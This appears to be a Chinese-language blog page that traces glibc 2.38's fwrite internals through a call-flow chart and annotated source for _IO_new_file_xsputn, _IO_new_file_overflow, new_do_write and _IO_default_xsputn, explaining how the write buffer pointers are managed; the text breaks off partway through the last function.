<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flowchart TB</span><br><span class="line">fwrite[fwrite]</span><br><span class="line">_IO_fwrite[_IO_fwrite @ glibc-2.38/libio/iofwrite.c:32]</span><br><span class="line">_IO_file_xsputn[_IO_new_file_xsputn @ glibc-2.38/libio/fileops.c:1197]</span><br><span class="line">_IO_file_overflow[</span><br><span class="line">	_IO_new_file_overflow @ glibc-2.38/libio/fileops.c:733</span><br><span class="line">	也会调用_IO_do_write将现有的缓冲区写入文件</span><br><span class="line">	然后缓冲区指针复位</span><br><span class="line">]</span><br><span class="line">_IO_do_write[_IO_new_do_write @ glibc-2.38/libio/fileops.c:425]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_do_write[</span><br><span class="line">	new_do_write @ glibc-2.38/libio/fileops.c:431</span><br><span class="line">	read缓冲区三个指针全等于_IO_buf_base</span><br><span class="line">	write缓冲区base和ptr指向_IO_buf_base, end指针指向</span><br><span class="line">]</span><br><span class="line">write[&quot;__write(f-&gt;_fileno,data,to_do)&quot;]</span><br><span class="line"></span><br><span class="line">_IO_file_write[_IO_new_file_write @ glibc-2.38/libio/fileops.c:1173]</span><br><span class="line"></span><br><span class="line">fwrite--&quot;_IO_sputn&quot;--&gt;_IO_fwrite</span><br><span class="line">_IO_fwrite--&gt;_IO_file_xsputn</span><br><span class="line">_IO_file_xsputn--&quot;_IO_OVERFLOW&quot;--&gt;_IO_file_overflow</span><br><span class="line">_IO_file_xsputn--&gt;_IO_do_write</span><br><span class="line">_IO_do_write--&gt;new_do_write</span><br><span class="line">new_do_write--&quot;_IO_SYSWRITE&quot;--&gt;_IO_file_write</span><br><span class="line">_IO_file_write--&gt;write</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)<span class="comment">//一个单位size字节,但是实际上还是以字节为单位</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);		<span class="comment">//check个寂寞</span></span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);		<span class="comment">//实际上调用_IO_new_file_xsputn</span></span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)		<span class="comment">//返回实际写入单位数,注意不是字节数</span></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;		<span class="comment">//数据指针</span></span><br><span class="line">  <span class="type">size_t</span> to_do = n;		<span class="comment">//当前还差多少个没有写入</span></span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;	<span class="comment">//行缓冲强制刷新缓冲区标志</span></span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;		<span class="comment">//当前缓冲区剩余空间</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line">  	<span class="comment">//如果要写入的大小大于一个块或者filebuf没有缓冲区,那么直接使用系统调用</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment">//如果使用行缓冲 并且 该f文件流目前正在进行写入操作</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;<span class="comment">//count表示当前写缓冲区剩余空间</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)			<span class="comment">//如果剩余空间足够大则直接写入</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )<span class="comment">//寻找最后一个\n,注意此时并未向缓冲区进行拷贝,只是寻找\n</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)		<span class="comment">//如果发现有换行符则must_flush置1表示必须刷新缓冲区</span></span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//否则如果写缓冲区中还有空间,首先计算一下剩余空间count</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)			<span class="comment">//如果剩余写缓冲区够大直接放到写缓冲区</span></span><br><span class="line">	count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);	<span class="comment">//直接从data搬到write_buf中</span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;<span class="comment">//to_do降为0表明已经写入writebuf了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//到此已经解决了写入比较少的情况,能够直接放到write_buf中</span></span><br><span class="line">    <span class="comment">//下面还要考虑的业务有:</span></span><br><span class="line">    <span class="comment">//1.行缓冲是否有\n结尾,也就是说must_flush是否置位, 如果是,则需要刷新缓冲区(也就是写入到文件)</span></span><br><span class="line">    <span class="comment">//2.写入量很大,超过了缓冲区剩余数量</span></span><br><span class="line">    	<span class="comment">//2.1首先把现有的缓冲区写入到文件,缓冲区复位,看看能否容纳写入量</span></span><br><span class="line">    	<span class="comment">//2.2如果还容纳不了,则直接syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//如果没开启行缓冲,(也就是must_flush=0),并且写入量比较小已经放到了缓冲区,那么可以返回了,不走下面的业务,直接return</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对于行缓冲需要刷新缓冲区,或者写入量太大时首先尝试缓冲区复位, 处理方式是一样的,首先都刷新缓冲区</span></span><br><span class="line">    <span class="comment">//接下来判断一下to_do看看还有没有需要写入的,对于已完成的行缓冲情况可以返回了</span></span><br><span class="line">    <span class="comment">//对于写入量大的情况,如果刷新了缓冲区之后,to_do还是大于缓冲区大小,则直接syscall</span></span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)		<span class="comment">//如果还有to_do则表明count&lt;to_do</span></span><br><span class="line">      								<span class="comment">//如果有must_flush说明行缓冲需要刷新缓冲区</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)			<span class="comment">//刷新缓冲区,将缓冲区写入文件,调整文件指针,如果已经到达文件末尾则返回EOF</span></span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      <span class="comment">//如果文件写满了,也就是EOF了,如果此时to_do为0,对应已经满足的行缓冲,返回EOF. </span></span><br><span class="line">      <span class="comment">//对于未满足的大量写入,返回已经写入的字节数n-to_do</span></span><br><span class="line">	  </span><br><span class="line">      </span><br><span class="line">	</span><br><span class="line">      <span class="comment">//如果控制流到这儿了,说明起码没有EOF</span></span><br><span class="line">      <span class="comment">//要么是已经刷新了缓冲区的行缓冲情况,要么是未满足的大量写入请求</span></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;		<span class="comment">//block_size大小是缓冲区大小</span></span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//如果block_size&gt;=128,则do_write = to_do - (to_do % block_size)</span></span><br><span class="line">      <span class="comment">//to_do大小可能是若干个整块最后是一个不满的块,这个不满的块大小就是(to_do % block_size)</span></span><br><span class="line">      <span class="comment">//这样算完之后,do_write就是若干整块 , 不包括最后的不满块</span></span><br><span class="line">    	</span><br><span class="line">	  <span class="comment">//否则block_size太小不足128,此时do_write就是to_do</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)					<span class="comment">//如果有do_write,下面就要实际写入了</span></span><br><span class="line">	&#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);	</span><br><span class="line">	  to_do -= count;			<span class="comment">//此时的to_do可能是不满块剩下的,或者new_do_write没有写完剩下的</span></span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)		<span class="comment">//如果实际上写入的不足do_write,说明new_do_write没有完成任务,要么是EOF,尽力了,返回实际读了多少</span></span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)				<span class="comment">//如果到这里还有to_do,说明是最后那个不满块,</span></span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);	</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_IO_OVERFLOW</code>这个宏实际上也是调用vtable[overflow]函数实现的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)				<span class="comment">//if (_IO_OVERFLOW (f, EOF) == EOF)</span></span><br><span class="line">&#123;<span class="comment">//ch是结束字符,如果是EOF则不附加在末尾,否则比如&#x27;\n&#x27;会附加在末尾</span></span><br><span class="line">    <span class="comment">//如果打开标志是&quot;r&quot;,也就是只读,那么会在_IO_new_file_fopen中设置_IO_NO_WRITES标志,表明只读打开</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span><span class="comment">//overflow的作用是将缓冲区写入文件,显然对于只读文件不能写</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;<span class="comment">//如果文件流f当前不不不处于往文件写入的状态, 或者文件流f没有write_buf</span></span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)	<span class="comment">//对于没有write_buf的情况则给f分配一个</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);			<span class="comment">//申请一个0x1000字节的write_buf给f</span></span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);	<span class="comment">//设置write_buf和buf相同</span></span><br><span class="line">	&#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))	</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      	<span class="comment">//初始化指针</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">			f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//这里实际上是f-&gt;_IO_write_ptr = f-&gt;_IO_buf_base 但是实际上f-&gt;_IO_read_ptr也是这个值,因此无所谓了</span></span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">		<span class="comment">//标记正在往文件写入</span></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)			<span class="comment">//如果ch为EOF则将目前的缓冲区先写入文件然后就返回了</span></span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<span class="comment">//_IO_do_write会复位缓冲区</span></span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">//如果writebuf满了</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)	<span class="comment">//也是先把目前缓冲区写入文件,实际上调用的是_IO_do_write,也会复位缓冲区 </span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;			<span class="comment">//最后补上一个ch字符</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)	<span class="comment">//如果不缓冲或者行缓冲并且有\n</span></span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,<span class="comment">//缓冲区写入文件,然后缓冲区复位</span></span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)<span class="comment">//如果最后剩下的块比当时的缓冲区大,还是会造成文件io的</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span>			<span class="comment">//count = new_do_write (f, s, do_write);</span></span><br><span class="line">&#123;	</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);	<span class="comment">//调整文件指针</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);		<span class="comment">//实际写,count是实际写入的字节数</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<span class="comment">//read_buf缓冲区参照buf复位</span></span><br><span class="line">    </span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;	<span class="comment">//write_buf复位</span></span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;<span class="comment">//如果缓冲区有空</span></span><br><span class="line">	  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)<span class="comment">//如果缓冲区空地够大</span></span><br><span class="line">	    count = more;</span><br><span class="line">          <span class="comment">//到这里时,count&lt;=more</span></span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)<span class="comment">//要么mempcpy实现拷贝,要么循环实现</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      <span class="type">ssize_t</span> i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">          <span class="comment">//如果more=0则不会执行后句,此时最后的剩余块也放到了缓冲区,不需要腾空了</span></span><br><span class="line">          <span class="comment">//否则more&gt;0表明还有剩下的,但是缓冲区此时满了,需要缓冲区写入文件,然后缓冲区复位</span></span><br><span class="line">          <span class="comment">//然后重新把剩下的放到缓冲区中</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    